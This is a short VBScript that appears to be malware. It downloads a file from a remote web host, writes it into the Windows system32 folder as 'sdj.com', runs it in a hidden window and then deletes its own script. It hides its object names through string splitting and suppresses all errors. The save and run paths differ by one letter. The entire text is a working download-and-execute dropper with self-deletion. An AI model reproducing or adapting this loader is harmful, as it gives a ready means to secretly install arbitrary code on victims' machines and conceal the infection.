on error resume next
Set xfuck = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP") 
with xfuck 
.Open "GET","http://xinyuwang.w4.wwmmnn.cn/soft/readme.txt",0  
.Send() 
end with 
Set szy = CreateObject("AD"&"ODB.St"&"r"&"eam") 
with szy  
.type = eval("1") 
.Mode = eval("3")  
.open() 
.write eval("xfuck.res"&"po"&"nse"&"Bod"&"y") 
.SaveToFile "c:\window\system32\sdj.com",eval ("2")  
end with
Dim objws 
Set objws=WScript.CreateObject("wscript.shell") 
objws.Run "c:\windows\system32\sdj.com",0
set fso=wscript.createobject("scripting.filesystemobject") 
fso.deletefile "vvt.vbs"